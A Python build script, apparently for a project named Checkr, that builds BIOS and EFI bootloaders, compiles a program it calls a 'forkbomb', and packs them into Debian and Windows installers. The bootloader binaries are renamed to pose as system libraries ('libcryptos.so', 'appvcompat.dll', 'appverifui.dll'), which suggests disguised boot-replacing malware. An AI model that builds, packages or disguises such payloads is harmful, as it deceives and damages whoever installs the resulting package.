#!env python3

import os, shutil, platform, json, getpass, subprocess, pathlib, zipfile, glob
from time import sleep
from colorama import Fore

done = False
username = getpass.getuser()
nasmpath = f"C:\\Users\\{username}\\AppData\\Local\\bin\\NASM\\nasm.exe"
msbuildpath = sorted(pathlib.Path("C:\\Program Files\\Microsoft Visual Studio").glob('**/MSBuild.exe'))[-1].__str__()
if os.path.exists("config.json") == False:
    print(f"{Fore.RED} Configuration file not found. Please ensure you have a configuration file.")
    exit(1)

conf = json.load(open('config.json'))

def verbose(fore, msg):
    if conf["verbose"] == "true": print(f"{fore} {msg} {Fore.RESET}")

def find(name, path):
    for root, dirs, files in os.walk(path):
        for file in files:
            if name == file:
                return os.path.join(root, name)

def cleanup():
    verbose(Fore.CYAN, "Cleaning up...")
    if os.path.exists("build"): shutil.rmtree("build", ignore_errors=True)
    verbose(Fore.GREEN, "Cleanup Done!\n{Fore.RESET}")
    
def is_tool(name):
    """Check whether `name` is on PATH and marked as executable."""
    return shutil.which(name) is not None

def prepare():
    verbose(Fore.CYAN, "Preparing build environment...")
        
    if os.path.exists("bin") == False: os.mkdir("bin")
    if os.path.exists("build") == False: os.mkdir("build")
    
    verbose(Fore.CYAN, "Checking tools...\n")
    if platform.system() == "Linux":
        if conf["distribution"] == "Arch":
            if is_tool("makepkg") == False: 
                print(f"{Fore.RED}makepkg is not installed{Fore.RESET}") 
                exit(1)
        elif conf["distribution"] == "Debian":
            if is_tool("dpkg-deb") == False:
                print(f"{Fore.RED}dpkg-deb is not installed{Fore.RESET}")
                exit(1)
        if is_tool("make") == False: 
            print(f"{Fore.RED}make is not installed{Fore.RESET}") 
            exit(1)
            
        if is_tool("gcc") == False: 
            print(f"{Fore.RED}gcc is not installed{Fore.RESET}")
            exit(1)

    if is_tool("git") == False: 
        print(f"{Fore.RED}git is not installed{Fore.RESET}")
        exit(1)
        
    if os.path.exists(nasmpath) == False: 
        print(f"{Fore.RED}nasm is not installed{Fore.RESET}")
        exit(1)
    
    verbose(Fore.GREEN, "Done.\n")
    
def makebios():
    print(f"{Fore.BLUE} BIOS bootloader is being built...")
    if platform.system() == "Linux":
        os.system("make -c Bootloader/BIOS > /dev/null")
        shutil.copyfile("Bootloader/BIOS/boot.bin", "build/boot.bin")
    else:
        os.system(f"{nasmpath} Bootloader/BIOS/bootloader.asm -f bin -o build/boot.bin")
    print(f"{Fore.GREEN} BIOS bootloader built!{Fore.RESET}")
    
def makeefi():
    if os.path.exists("build/boot.efi"): return
    target= "DEBUG" if conf["target"] == "DEBUG" else "RELEASE"
    arch=  "X64" if conf["arch"] == "x64" else "IA32" if conf["arch"] == "x86" else "AArch64"
    print(f"{Fore.BLUE} EFI bootloader is being built...{Fore.RESET}")
    os.chdir("build")
    verbose(Fore.CYAN, "Checking for edk2 installation...")
    if os.path.exists("edk2") != True: 
        verbose(Fore.CYAN, "Cloning edk2...")
        os.system("git clone https://github.com/tianocore/edk2.git")
        os.chdir("edk2")
        verbose(Fore.CYAN, "Initializing submodules...")
        os.system("git submodule update --init --recursive")
        verbose(Fore.CYAN, "Compiling tools...")
        os.system("make -C BaseTools > /dev/null")
    else:
        os.chdir("edk2")
    
    os.mkdir("CheckrPkg")
    os.chdir("CheckrPkg")
    verbose(Fore.CYAN, "Copying files...")
    shutil.copyfile("../../../Bootloader/EFI/CheckrPkg.dsc", "CheckrPkg.dsc")
    shutil.copyfile("../../../Bootloader/EFI/Checkr.inf", "Checkr.inf")
    shutil.copyfile("../../../Bootloader/EFI/Checkr.c", "Checkr.c")
    os.chdir("../")
    verbose(Fore.CYAN, "Configuring edk2...")
    os.system("bash -c \"source edksetup.sh\"")
    eficonf = open("Conf/target.txt").readlines()
    eficonf[19] = "ACTIVE_PLATFORM       = CheckrPkg/CheckrPkg.dsc\n"
    if conf["target"] == "DEBUG": eficonf[27] = "TARGET                = DEBUG\n"
    else: eficonf[27] = "TARGET                = RELEASE\n"
    if conf["arch"] == "x64": eficonf[43] = "TARGET_ARCH           = X64\n"
    elif conf["arch"] == "x86": eficonf[43] = "TARGET_ARCH           = IA32\n"
    elif conf["arch"] == "arm64": eficonf[43] = "TARGET_ARCH           = AArch64\n"
    eficonf[53] = "TOOL_CHAIN_TAG        = GCC5\n"
    with open("Conf/target.txt", "w") as f: f.writelines(eficonf)
    verbose(Fore.CYAN, "Building bootloader...")
    os.system("bash -c \"source edksetup.sh && build\"")
    shutil.copyfile(f"CheckrPkg/Build/{target}_GCC5/{arch}/Checkr.efi", "../../build/boot.efi")
    print(f"{Fore.GREEN}EFI bootloader built!{Fore.RESET}")

def makelinux():
    print(f"{Fore.BLUE} Linux installer is being built...")
    os.chdir("Installer/Linux")
    verbose(Fore.CYAN, "Compiling forkbomb...")
    os.system("gcc -o fork fork.c")
    verbose(Fore.CYAN, "Copying files...")
    os.chdir("../..")
    if conf["distribution"] == "Arch":
        shutil.copytree("Templates/Arch", "build/arch")
    else:
        shutil.copytree("Templates/Debian", "build/debian")
        shutil.copyfile("Installer/Linux/src/main.py", "build/debian/bin/checkr")
        shutil.copyfile("Installer/Linux/fork", "build/debian/lib/fork")
        shutil.copyfile("build/boot.bin", "build/debian/lib/libcryptos.so")
        shutil.copyfile("build/boot.efi", "build/debian/lib/libefia.so")
        os.system("chmod +x build/debian/DEBIAN/postinst")
        os.system("chmod +x /lib/fork")
        os.system("dpkg-deb --build build/debian")
    
    print(f"{Fore.GREEN} Linux installer built!{Fore.RESET}")

def makewindows():
    print(f"{Fore.BLUE} Windows installer is being built...")
    os.chdir("./Installer/Windows")
    verbose(Fore.CYAN, "Compiling project...")
    subprocess.call(f"cmd /c \"{msbuildpath}\" -p:Configuration=Release > nul", shell=True)
    verbose(Fore.CYAN, "Copying files...")
    os.chdir("../..")
    shutil.copyfile(f"Installer/Windows/{'x64/Release' if conf['arch'] == 'x64' else 'Release'}/Checkr.exe", "build/Checkr.exe")
    if conf['buildtype'] == "installer":
        print(f"{Fore.GREEN} Windows installer built.{Fore.RESET}")   
    else:
        package()
        print(f"{Fore.GREEN} Windows package built.{Fore.RESET}")
         
         
def package():
    verbose(Fore.BLUE, "Packaging...")
    if os.path.exists("build/boot.bin") == False:
        print(f"{Fore.RED}BIOS Bootloader not found! Please build it with the 'bootloader' target or download it manually from https://github.com/tunafysh/Checkr/releases/tag/Bootloader-Binaries in the build directory and rerun this script.{Fore.RESET}")
        exit()
    if os.path.exists("build/boot.efi") == False:
        if platform.system() == "Linux":
            print(f"{Fore.RED}EFI Bootloader not found! Please build it with the 'bootloader' target or download it manually from https://github.com/tunafysh/Checkr/releases/tag/Bootloader-Binaries in the build directory and rerun this script.{Fore.RESET}")
        else:
            print(f"{Fore.RED}EFI Bootloader not found! Please download it from {Fore.CYAN}https://github.com/tunafysh/Checkr/releases/tag/Bootloader-Binaries{Fore.RED} in the build directory and rerun this script.{Fore.RESET}")
            exit()
    os.chdir("build")
    shutil.move("boot.bin", "appvcompat.dll")
    shutil.move("boot.efi", "appverifui.dll")
    with zipfile.ZipFile(f"{conf['pkgname']}-{conf['pkgver']}.zip", 'w') as z:
        z.write("appvcompat.dll")
        z.write("appverifui.dll")
        z.write("Checkr.exe")
    os.chdir("..")
    shutil.copyfile(f"build/{conf['pkgname']}-{conf['pkgver']}.zip", f"bin/{conf['pkgname']}-{conf['pkgver']}.zip")
    
prepare()

print(f"{Fore.MAGENTA} Configuration:\n Build type: {conf['buildtype']}\n Architecture: {conf['arch']}\n Package name: {conf['pkgname']}\n")

print(f"{Fore.YELLOW}Checklist:\n")

match(conf['buildtype']):
    case 'all':
        if platform.system() == "Windows":
            todo = ['bios', 'installer']
            print(f"{Fore.YELLOW}    + Build BIOS Bootloader\n    + Build Installer\n")
        else:
            todo = ['bios', 'uefi', 'installer']
            print(f"{Fore.YELLOW}    + Build BIOS Bootloader\n    + Build UEFI Bootloader\n    + Build Installer\n")
    case 'bootloader':
        if platform.system() == "Windows":
            todo = ['bios']
            print(f"{Fore.YELLOW}   + Build BIOS Bootloader\n")
        else:
            print(f"{Fore.YELLOW}   + Build BIOS Bootloader\n     + Build UEFI Bootloader\n")
            todo = ['bios', 'uefi']
    case 'installer':
        print(f"{Fore.YELLOW}    + Build Installer\n")
        todo = ['installer']


# if platform.system() == "Linux": print(f"{Fore.YELLOW}Checklist:\n + Build BIOS Bootloader\n + Build UEFI Bootloader\n + Build Installer\n")
# if platform.system() == "Windows": print(f"{Fore.YELLOW}Checklist:\n + Build Installer\n")

print(f"{Fore.BLUE}Starting build in 5 seconds...{Fore.RESET}\n")
sleep(5)

if conf["buildtype"] == "all" and platform.system() == "Linux":
    makebios()
    makeefi()
    makelinux()
elif conf["buildtype"] == "all" and platform.system() == "Windows":
    makebios()
    makewindows()
elif conf["buildtype"] == "bootloader" and platform.system() == "Linux":
    makebios()
    makeefi()
elif conf["buildtype"] == "installer" and platform.system() == "Linux":
    makelinux()
elif conf["buildtype"] == "installer" and platform.system() == "Windows":
    makewindows()
else:
    print(f"{Fore.RED}Invalid build type: {conf['buildtype']}")
    
if conf["cleanup"] == "true": 
        cleanup()